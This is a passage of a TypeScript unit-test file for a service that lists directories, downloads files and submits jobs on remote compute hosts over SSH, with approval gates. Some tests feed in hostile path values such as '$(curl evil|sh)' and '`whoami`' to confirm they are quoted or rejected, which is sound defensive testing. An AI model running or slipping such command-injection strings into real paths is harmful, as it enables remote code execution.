    const service = new ComputeService(runner, repo)

    const err = await service.listDir('ssh:biowulf', '/no/such/path').catch((e) => e)
    expect(err.remoteFsError?.remoteKind).toBe('not_found')
  })

  it('throws when the host does not exist', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '/p\n/h\n',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo(null)
    const service = new ComputeService(runner, repo)

    await expect(service.listDir('ssh:nonexistent', '/path')).rejects.toThrow(
      /not found|no compute host/i
    )
  })

  it('converts float mtime to milliseconds', async () => {
    const findOut = findRecord('f', 1024, 1704067200.5, 'data.csv')
    const stdout = buildListDirStdout('/path', '/home/user', findOut)
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout,
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = new ComputeService(runner, repo)

    const result = await service.listDir('ssh:biowulf', '/path')

    expect(result.entries[0]?.mtimeMs).toBe(1704067200500)
  })

  it('handles names with spaces', async () => {
    const findOut = findRecord('f', 100, 1704067200.0, 'my file with spaces.txt')
    const stdout = buildListDirStdout('/path', '/home/user', findOut)
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout,
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = new ComputeService(runner, repo)

    const result = await service.listDir('ssh:biowulf', '/path')

    expect(result.entries[0]?.name).toBe('my file with spaces.txt')
  })

  it('single-quotes an injection path so the remote shell cannot expand it', async () => {
    // A malicious directory name double-clicked in the browser must not reach the shell unquoted.
    const runMock = vi.fn(() =>
      Promise.resolve({
        exitCode: 0,
        stdout: buildListDirStdout('/p', '/home/user', ''),
        stderr: '',
        truncated: false,
        timedOut: false
      })
    )
    const runner: SshRunner = { run: runMock }
    const { repo } = makeRepo()
    const service = new ComputeService(runner, repo)

    await service.listDir('ssh:biowulf', '/data/$(curl evil|sh)')

    const remoteCmd = (runMock.mock.calls[0] as unknown as [unknown, string])[1]
    // The dangerous path appears only inside single quotes; there is no bare $( in the command
    // outside a single-quoted context. Assert the single-quoted literal is present verbatim.
    expect(remoteCmd).toContain(`'/data/$(curl evil|sh)'`)
  })
})

// ---------------------------------------------------------------------------
// ComputeService.list — issue 06
// ---------------------------------------------------------------------------

describe('ComputeService.list', () => {
  it('returns all hosts from the repository', async () => {
    const hosts = [
      sampleHost({ providerId: 'ssh:biowulf', displayName: 'biowulf' }),
      sampleHost({ providerId: 'ssh:lab-gpu', displayName: 'lab-gpu', id: 'host-2' })
    ]
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    ;(repo.list as ReturnType<typeof vi.fn>).mockResolvedValue(hosts)
    const service = new ComputeService(runner, repo)

    const result = await service.list()
    expect(result).toHaveLength(2)
    expect(result[0].providerId).toBe('ssh:biowulf')
    expect(result[1].providerId).toBe('ssh:lab-gpu')
  })
})

// ---------------------------------------------------------------------------
// ComputeService.appendDetails — issue 06
// ---------------------------------------------------------------------------

describe('ComputeService.appendDetails', () => {
  it('appends text to an empty doc', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo, updateDetails } = makeRepo(sampleHost({ detailsDoc: '' }))
    const service = new ComputeService(runner, repo)

    await service.appendDetails('ssh:biowulf', { text: '## Note\nhello', author: 'agent' })

    expect(updateDetails).toHaveBeenCalledWith('ssh:biowulf', '## Note\nhello', 'agent')
  })

  it('appends text with a newline separator when doc is non-empty', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo, updateDetails } = makeRepo(sampleHost({ detailsDoc: '## Resources\ncpus: 4' }))
    const service = new ComputeService(runner, repo)

    await service.appendDetails('ssh:biowulf', { text: '## Note\nhello', author: 'agent' })

    expect(updateDetails).toHaveBeenCalledWith(
      'ssh:biowulf',
      '## Resources\ncpus: 4\n## Note\nhello',
      'agent'
    )
  })

  it('throws when the appended doc would exceed 32KB', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const bigDoc = 'x'.repeat(32760)
    const { repo } = makeRepo(sampleHost({ detailsDoc: bigDoc }))
    const service = new ComputeService(runner, repo)

    await expect(
      service.appendDetails('ssh:biowulf', { text: 'overflow', author: 'agent' })
    ).rejects.toThrow(/32768|characters or fewer/i)
  })

  it('throws when host is not found', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo(null)
    const service = new ComputeService(runner, repo)

    await expect(
      service.appendDetails('ssh:ghost', { text: 'hello', author: 'agent' })
    ).rejects.toThrow(/no compute host found/i)
  })
})

// ---------------------------------------------------------------------------
// ComputeService.download — fake SshRunner + fake ScpRunner
// ---------------------------------------------------------------------------

// Fake ScpRunner: returns a configurable result.
const makeFakeScpRunner = (result: Awaited<ReturnType<ScpRunner['copy']>>): ScpRunner => ({
  copy: vi.fn(() => Promise.resolve(result))
})

// Success scpRunner.
const successScpRunner = makeFakeScpRunner({ exitCode: 0, stderr: '', timedOut: false })

describe('ComputeService.download (os-downloads)', () => {
  let tmpDir: string

  beforeEach(async () => {
    tmpDir = await mkdtemp(join(tmpdir(), 'cs-download-test-'))
  })

  afterEach(async () => {
    await rm(tmpDir, { recursive: true, force: true })
  })

  it('downloads a file to os-downloads and returns LocalFile', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '1024',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    // Fake the scpRunner to create the dest file so stat succeeds after transfer.
    const scpRunner: ScpRunner = {
      copy: vi.fn(async (_bin, args) => {
        // args last element is local dest path
        const localPath = args[args.length - 1] as string
        await writeFile(localPath, 'x'.repeat(1024))
        return { exitCode: 0, stderr: '', timedOut: false }
      })
    }
    const service = new ComputeService(runner, repo, undefined, scpRunner, tmpDir)
    const dest: DownloadDest = { kind: 'os-downloads' }

    const result = await service.download('ssh:biowulf', '/remote/data.csv', dest)

    expect(result.name).toBe('data.csv')
    expect(result.size).toBe(1024)
    expect(result.path).toContain('data.csv')
    expect(result.mimeType).toBe('text/csv')
  })

  it('renames colliding file with (1) suffix', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '100',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    // Pre-create the collision file.
    await writeFile(join(tmpDir, 'data.csv'), 'existing')
    const scpRunner: ScpRunner = {
      copy: vi.fn(async (_bin, args) => {
        const localPath = args[args.length - 1] as string
        await writeFile(localPath, 'downloaded')
        return { exitCode: 0, stderr: '', timedOut: false }
      })
    }
    const service = new ComputeService(runner, repo, undefined, scpRunner, tmpDir)
    const result = await service.download('ssh:biowulf', '/remote/data.csv', {
      kind: 'os-downloads'
    })

    expect(result.name).toBe('data (1).csv')
  })

  it('throws too_large when stat says >2GiB', async () => {
    const bigSize = 2 * 1024 * 1024 * 1024 + 1
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: `f ${bigSize}`,
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const scpRunner: ScpRunner = {
      copy: vi.fn(async () => ({ exitCode: 0, stderr: '', timedOut: false }))
    }
    const service = new ComputeService(runner, repo, undefined, scpRunner, tmpDir)

    const err = await service
      .download('ssh:biowulf', '/remote/big.bin', { kind: 'os-downloads' })
      .catch((e) => e)
    expect(err.remoteFsError?.remoteKind).toBe('too_large')
  })

  it('throws connection error when scp fails with exit 255', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 100',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const scpRunner = makeFakeScpRunner({
      exitCode: 255,
      stderr: 'Connection refused',
      timedOut: false
    })
    const service = new ComputeService(runner, repo, undefined, scpRunner, tmpDir)

    const err = await service
      .download('ssh:biowulf', '/remote/data.csv', { kind: 'os-downloads' })
      .catch((e) => e)
    expect(err.remoteFsError?.remoteKind).toBe('connection')
  })

  it('throws when host is not found', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 100',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo(null)
    const service = new ComputeService(runner, repo, undefined, successScpRunner, tmpDir)

    await expect(
      service.download('ssh:nonexistent', '/remote/data.csv', { kind: 'os-downloads' })
    ).rejects.toThrow(/no compute host found/i)
  })

  it('rejects an injection path (outside_roots) before scp', async () => {
    const scpCopy = vi.fn(() => Promise.resolve({ exitCode: 0, stderr: '', timedOut: false }))
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 100',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = new ComputeService(runner, repo, undefined, { copy: scpCopy }, tmpDir)

    const err = await service
      .download('ssh:biowulf', '/remote/`whoami`.csv', { kind: 'os-downloads' })
      .catch((e) => e)

    expect(err.remoteFsError?.remoteKind).toBe('outside_roots')
    expect(scpCopy).not.toHaveBeenCalled()
  })
})

describe('ComputeService.download (artifact)', () => {
  let tmpDir: string

  beforeEach(async () => {
    tmpDir = await mkdtemp(join(tmpdir(), 'cs-artifact-test-'))
  })

  afterEach(async () => {
    await rm(tmpDir, { recursive: true, force: true })
  })

  it('imports a file as artifact and returns LocalFile with provenance', async () => {
    // stat command returns: is_file=1 size=4096
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 4096',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const scpRunner: ScpRunner = {
      copy: vi.fn(async (_bin, args) => {
        const localPath = args[args.length - 1] as string
        await writeFile(localPath, 'x'.repeat(4096))
        return { exitCode: 0, stderr: '', timedOut: false }
      })
    }
    const service = new ComputeService(runner, repo, undefined, scpRunner, tmpDir)
    const dest: DownloadDest = { kind: 'artifact', projectId: 'proj-1' }

    const result = await service.download('ssh:biowulf', '/remote/results.csv', dest)

    expect(result.name).toBe('results.csv')
    expect(result.size).toBe(4096)
    expect(result.mimeType).toBe('text/csv')
    expect(result.artifactId).toBeDefined()
  })

  it('throws not_a_file when remote is empty (size=0)', async () => {
    // stat returns size=0 → empty file rejected
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 0',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = new ComputeService(runner, repo, undefined, successScpRunner, tmpDir)

    const err = await service
      .download('ssh:biowulf', '/remote/empty.csv', { kind: 'artifact', projectId: 'proj-1' })
      .catch((e) => e)
    expect(err.remoteFsError?.remoteKind).toBe('not_a_file')
  })

  it('throws too_large when remote file >50MB', async () => {
    const bigSize = 50 * 1024 * 1024 + 1
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: `f ${bigSize}`,
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = new ComputeService(runner, repo, undefined, successScpRunner, tmpDir)

    const err = await service
      .download('ssh:biowulf', '/remote/big.csv', { kind: 'artifact', projectId: 'proj-1' })
      .catch((e) => e)
    expect(err.remoteFsError?.remoteKind).toBe('too_large')
  })

  it('throws outside_roots when path has glob chars', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 100',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = new ComputeService(runner, repo, undefined, successScpRunner, tmpDir)

    const err = await service
      .download('ssh:biowulf', '/remote/*.csv', { kind: 'artifact', projectId: 'proj-1' })
      .catch((e) => e)
    expect(err.remoteFsError?.remoteKind).toBe('outside_roots')
  })

  it('throws not_a_file when remote is a directory', async () => {
    // stat returns type 'd'
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'd 4096',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = new ComputeService(runner, repo, undefined, successScpRunner, tmpDir)

    const err = await service
      .download('ssh:biowulf', '/remote/mydir', { kind: 'artifact', projectId: 'proj-1' })
      .catch((e) => e)
    expect(err.remoteFsError?.remoteKind).toBe('not_a_file')
  })

  it('throws not_a_file if post-transfer re-stat detects size growth', async () => {
    // Pre-transfer stat: 100 bytes; post-transfer actual file: 200 bytes (growth detected)
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'f 100',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const scpRunner: ScpRunner = {
      copy: vi.fn(async (_bin, args) => {
        const localPath = args[args.length - 1] as string
        // Write more bytes than reported by pre-transfer stat (simulates growth during transfer)
        await writeFile(localPath, 'x'.repeat(200))
        return { exitCode: 0, stderr: '', timedOut: false }
      })
    }
    const service = new ComputeService(runner, repo, undefined, scpRunner, tmpDir)

    const err = await service
      .download('ssh:biowulf', '/remote/growing.csv', { kind: 'artifact', projectId: 'proj-1' })
      .catch((e) => e)
    expect(err.remoteFsError?.remoteKind).toBe('not_a_file')
  })
})

// ---------------------------------------------------------------------------
// ComputeService.download (session-cache) — agent approval gate
// ---------------------------------------------------------------------------

describe('ComputeService.download (session-cache)', () => {
  let tmpDir: string

  beforeEach(async () => {
    tmpDir = await mkdtemp(join(tmpdir(), 'cs-session-cache-test-'))
  })

  afterEach(async () => {
    await rm(tmpDir, { recursive: true, force: true })
  })

  it('downloads to session cache and returns LocalFile when approved', async () => {
    // Stat not needed for session-cache; runner is used only for stat on other paths.
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const scpRunner: ScpRunner = {
      copy: vi.fn(async (_bin, args) => {
        const localPath = args[args.length - 1] as string
        await writeFile(localPath, 'content')
        return { exitCode: 0, stderr: '', timedOut: false }
      })
    }
    const broker = makeApprovalBroker('once')
    const service = new ComputeService(runner, repo, broker, scpRunner, tmpDir)

    const result = await service.download('ssh:biowulf', '/remote/results.csv', {
      kind: 'session-cache'
    })

    expect(result.name).toBe('results.csv')
    expect(result.size).toBe(7) // 'content' is 7 bytes
    expect(result.path).toContain('results.csv')
    expect(result.mimeType).toBe('text/csv')
  })

  it('throws download_denied when broker denies session-cache download', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const broker = makeApprovalBroker('deny')
    const service = new ComputeService(runner, repo, broker, successScpRunner, tmpDir)

    const err = await service
      .download('ssh:biowulf', '/remote/secret.key', { kind: 'session-cache' })
      .catch((e) => e)
    expect(err.message).toMatch(/download_denied|denied/i)
  })

  it('fires approval BEFORE scp for session-cache', async () => {
    const callOrder: string[] = []

    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const scpRunner: ScpRunner = {
      copy: vi.fn(async (_bin, args) => {
        callOrder.push('scp')
        const localPath = args[args.length - 1] as string
        await writeFile(localPath, 'data')
        return { exitCode: 0, stderr: '', timedOut: false }
      })
    }
    const broker: ComputeApprovalBroker = {
      request: vi.fn(() => {
        callOrder.push('approval')
        return Promise.resolve('once')
      }),
      requestWithContext: vi.fn(() => {
        callOrder.push('approval')
        return Promise.resolve('once')
      }),
      respond: vi.fn()
    } as unknown as ComputeApprovalBroker

    const service = new ComputeService(runner, repo, broker, scpRunner, tmpDir)
    await service.download('ssh:biowulf', '/remote/data.csv', { kind: 'session-cache' })

    expect(callOrder).toEqual(['approval', 'scp'])
  })

  it('uses requestWithContext when session/project context is supplied', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const scpRunner: ScpRunner = {
      copy: vi.fn(async (_bin, args) => {
        const localPath = args[args.length - 1] as string
        await writeFile(localPath, 'data')
        return { exitCode: 0, stderr: '', timedOut: false }
      })
    }
    const broker: ComputeApprovalBroker = {
      request: vi.fn(() => Promise.resolve('once')),
      requestWithContext: vi.fn(() => Promise.resolve('conversation')),
      respond: vi.fn()
    } as unknown as ComputeApprovalBroker

    const service = new ComputeService(runner, repo, broker, scpRunner, tmpDir)
    await service.download(
      'ssh:biowulf',
      '/remote/data.csv',
      { kind: 'session-cache' },
      { sessionId: 'sess-1', projectId: 'proj-1' }
    )

    expect(vi.mocked(broker.requestWithContext)).toHaveBeenCalledOnce()
    expect(vi.mocked(broker.request)).not.toHaveBeenCalled()
  })

  it('does NOT trigger approval for os-downloads', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '100',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const scpRunner: ScpRunner = {
      copy: vi.fn(async (_bin, args) => {
        const localPath = args[args.length - 1] as string
        await writeFile(localPath, 'x'.repeat(100))
        return { exitCode: 0, stderr: '', timedOut: false }
      })
    }
    const broker = makeApprovalBroker('deny') // if called, denies
    const service = new ComputeService(runner, repo, broker, scpRunner, tmpDir)

    // os-downloads should NOT consult the broker - should succeed even with deny broker
    const result = await service.download('ssh:biowulf', '/remote/file.txt', {
      kind: 'os-downloads'
    })
    expect(result.name).toBe('file.txt')
    // Confirm broker was NOT called
    expect(vi.mocked(broker.request)).not.toHaveBeenCalled()
  })

  it('throws when no approval broker is configured for session-cache', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = new ComputeService(runner, repo) // no broker

    await expect(
      service.download('ssh:biowulf', '/remote/data.csv', { kind: 'session-cache' })
    ).rejects.toThrow(/broker|required/i)
  })

  it('rejects an injection path (outside_roots) BEFORE approval or scp', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const brokerRequest = vi.fn(() => Promise.resolve('once' as const))
    const scpCopy = vi.fn(() => Promise.resolve({ exitCode: 0, stderr: '', timedOut: false }))
    const broker = {
      request: brokerRequest,
      requestWithContext: brokerRequest,
      respond: vi.fn()
    } as unknown as ComputeApprovalBroker
    const service = new ComputeService(runner, repo, broker, { copy: scpCopy }, tmpDir)

    const err = await service
      .download('ssh:biowulf', '/remote/$(curl evil|sh).csv', { kind: 'session-cache' })
      .catch((e) => e)

    expect(err.remoteFsError?.remoteKind).toBe('outside_roots')
    // Neither the approval card nor scp should have been reached.
    expect(brokerRequest).not.toHaveBeenCalled()
    expect(scpCopy).not.toHaveBeenCalled()
  })
})

// ---------------------------------------------------------------------------
// ComputeService.submitJob — unit tests with injected fakes
// ---------------------------------------------------------------------------

const makeJobRepo = (
  jobs: Map<string, import('../../shared/compute').ComputeJob> = new Map()
): {
  repo: import('./job-repository').ComputeJobRepository
  createCalls: ReturnType<typeof vi.fn>
  updateCalls: ReturnType<typeof vi.fn>
} => {
  const createCalls = vi.fn(async (request: import('./job-repository').CreateJobRequest) => {
    const job: import('../../shared/compute').ComputeJob = {
      job_id: request.id,
      provider_id: request.providerId,
      shape: request.shape,
      session_id: request.sessionId,
      project_id: request.projectId,
      status: 'submitted',
      intent: request.intent,
      command: request.command,
      command_hash: request.commandHash,
      environment: request.environment,
      resource_request: request.resourceRequest,
      input_manifest: request.inputManifest,
      output_manifest: request.outputManifest,
      harvest_config: request.harvestConfig,
      timeout_seconds: request.timeoutSeconds,
      remote_workdir: request.remoteWorkdir,
      remote_handle: undefined,
      exit_code: undefined,
      stdout_tail: undefined,
      stderr_tail: undefined,
      error_code: undefined,
      created_at: Date.now(),
      submitted_at: Date.now(),
      started_at: undefined,
      finished_at: undefined,
      harvested_at: undefined
    }
    jobs.set(request.id, job)
    return job
  })
  const updateCalls = vi.fn(async (jobId: string, updates: unknown) => {
    const job = jobs.get(jobId) ?? { job_id: jobId }
    const updated = { ...job, ...(updates as object) }
    jobs.set(jobId, updated as import('../../shared/compute').ComputeJob)
    return updated as import('../../shared/compute').ComputeJob
  })
  const getCalls = vi.fn(async (jobId: string) => jobs.get(jobId) ?? null)
  const findNonTerminalCalls = vi.fn(async () => Array.from(jobs.values()))

  return {
    repo: {
      create: createCalls,
      get: getCalls,
      update: updateCalls,
      findNonTerminal: findNonTerminalCalls,
      findNonTerminalByProvider: vi.fn(async () => []),
      hasActiveJobsForProvider: vi.fn(async () => false)
    } as unknown as import('./job-repository').ComputeJobRepository,
    createCalls,
    updateCalls
  }
}

describe('ComputeService.submitJob', () => {
  it('returns job_id + remote_workdir immediately (before dispatch)', async () => {
    // Runner should never be called for submit_job itself (dispatch is background).
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo: jobRepo, createCalls } = makeJobRepo()
    const { repo } = makeRepo()

    const approveDecision = vi.fn(() => Promise.resolve('once' as const))
    const broker = {
      request: approveDecision,
      requestWithContext: approveDecision,
      respond: vi.fn()
    } as unknown as ComputeApprovalBroker

    const service = new ComputeService(runner, repo, broker, undefined, undefined, jobRepo)

    const result = await service.submitJob(
      'ssh:biowulf',
      'smoke test',
      'echo hello',
      {},
      { sessionId: 'sess-1', projectId: 'proj-1' }
    )

    expect(result.status).toBe('submitted')
    expect(result.provider_id).toBe('ssh:biowulf')
    expect(result.job_id).toBeDefined()
    expect(result.remote_workdir).toContain('.openscience/jobs/')
    expect(createCalls).toHaveBeenCalledOnce()
  })

  it('throws approval_denied and does NOT create a DB row when approval is denied', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo: jobRepo, createCalls } = makeJobRepo()
    const { repo } = makeRepo()

    const denyDecision = vi.fn(() => Promise.resolve('deny' as const))
    const broker = {
      request: denyDecision,
      requestWithContext: denyDecision,
      respond: vi.fn()
    } as unknown as ComputeApprovalBroker

    const service = new ComputeService(runner, repo, broker, undefined, undefined, jobRepo)

    const err = await service
      .submitJob('ssh:biowulf', 'test', 'echo hi', {}, { sessionId: 's1', projectId: 'p1' })
      .catch((e) => e)

    expect(err.computeCallError?.error_code).toBe('approval_denied')
    // No DB row should have been created.
    expect(createCalls).not.toHaveBeenCalled()
  })

  it('uses operation=submit_job for grant memory (not call_command)', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo: jobRepo } = makeJobRepo()
    const { repo } = makeRepo()

    const requestWithContext = vi.fn(() => Promise.resolve('conversation' as const))
    const broker = {
      request: vi.fn(),
      requestWithContext,
      respond: vi.fn()
    } as unknown as ComputeApprovalBroker

    const service = new ComputeService(runner, repo, broker, undefined, undefined, jobRepo)

    await service.submitJob(
      'ssh:biowulf',
      'test',
      'echo hi',
      {},
      { sessionId: 's1', projectId: 'p1' }
    )

    expect(requestWithContext).toHaveBeenCalledWith(
      expect.anything(),
      expect.objectContaining({ operation: 'submit_job' })
    )
  })

  it('rejects timeout_seconds > 7 days', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo: jobRepo } = makeJobRepo()
    const { repo } = makeRepo()
    const broker = {
      request: vi.fn(),
      requestWithContext: vi.fn(() => Promise.resolve('once' as const)),
      respond: vi.fn()
    } as unknown as ComputeApprovalBroker

    const service = new ComputeService(runner, repo, broker, undefined, undefined, jobRepo)

    const err = await service
      .submitJob(
        'ssh:biowulf',
        'test',
        'echo hi',
        { timeoutSeconds: 8 * 24 * 3600 },
        { sessionId: 's1', projectId: 'p1' }
      )
      .catch((e) => e)

    expect(err.computeCallError?.error_code).toBe('timeout')
  })

  it('approval fires before any DB row is created (security contract)', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo: jobRepo, createCalls } = makeJobRepo()
    const { repo } = makeRepo()

    let approvalCalledAt: number | undefined
    let createCalledAt: number | undefined

    const requestWithContext = vi.fn(async () => {
      approvalCalledAt = Date.now()
      await new Promise((r) => setTimeout(r, 1))
      return 'once' as const
    })
    const broker = {
      request: vi.fn(),
      requestWithContext,
      respond: vi.fn()
    } as unknown as ComputeApprovalBroker

    createCalls.mockImplementation(async (request: import('./job-repository').CreateJobRequest) => {
      createCalledAt = Date.now()
      return {
        job_id: request.id,
        provider_id: request.providerId,
        shape: request.shape,
        session_id: request.sessionId,
        project_id: request.projectId,
        status: 'submitted' as const,
        intent: request.intent,
        command: request.command,
        command_hash: request.commandHash,
        environment: undefined,
        resource_request: undefined,
        input_manifest: undefined,
        output_manifest: undefined,
        harvest_config: undefined,
        timeout_seconds: request.timeoutSeconds,
        remote_workdir: request.remoteWorkdir,
        remote_handle: undefined,
        exit_code: undefined,
        stdout_tail: undefined,
        stderr_tail: undefined,
        error_code: undefined,
        created_at: Date.now(),
        submitted_at: Date.now(),
        started_at: undefined,
        finished_at: undefined,
        harvested_at: undefined
      }
    })

    const service = new ComputeService(runner, repo, broker, undefined, undefined, jobRepo)
    await service.submitJob(
      'ssh:biowulf',
      'test',
      'echo hi',
      {},
      { sessionId: 's1', projectId: 'p1' }
    )

    expect(approvalCalledAt).toBeDefined()
    expect(createCalledAt).toBeDefined()
    expect(approvalCalledAt!).toBeLessThan(createCalledAt!)
  })
})

describe('ComputeService.getJobStatus', () => {
  it('returns status shape from DB without SSH', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const jobs = new Map<string, import('../../shared/compute').ComputeJob>()
    const job: import('../../shared/compute').ComputeJob = {
      job_id: 'job-42',
      provider_id: 'ssh:biowulf',
      shape: 'direct_ssh',
      session_id: 'sess-1',
      project_id: 'proj-1',
      status: 'success',
      intent: 'test',
      command: 'echo hi',
      command_hash: 'abc',
      environment: undefined,
      resource_request: undefined,
      input_manifest: undefined,
      output_manifest: undefined,
      harvest_config: undefined,
      timeout_seconds: 3600,
      remote_workdir: '~/.openscience/jobs/job-42',
      remote_handle: undefined,
      exit_code: 0,
      stdout_tail: 'hi\n',
      stderr_tail: '',
      error_code: undefined,
      created_at: 1,
      submitted_at: 1,
      started_at: 1,
      finished_at: 2,
      harvested_at: undefined
    }
    jobs.set('job-42', job)
    const { repo: jobRepo } = makeJobRepo(jobs)
    const { repo } = makeRepo()

    const service = new ComputeService(runner, repo, undefined, undefined, undefined, jobRepo)

    const status = await service.getJobStatus('job-42')
    expect(status.job_id).toBe('job-42')
    expect(status.status).toBe('success')
    expect(status.exit_code).toBe(0)
    expect(status.stdout_tail).toBe('hi\n')
    expect(status.remote_workdir).toBe('~/.openscience/jobs/job-42')

    // SSH runner should NOT have been called.
    expect((runner.run as ReturnType<typeof vi.fn>).mock.calls.length).toBe(0)
  })

  it('throws when job not found', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo: jobRepo } = makeJobRepo()
    const { repo } = makeRepo()

    const service = new ComputeService(runner, repo, undefined, undefined, undefined, jobRepo)

    await expect(service.getJobStatus('nonexistent')).rejects.toThrow(/No compute job/)
  })
})
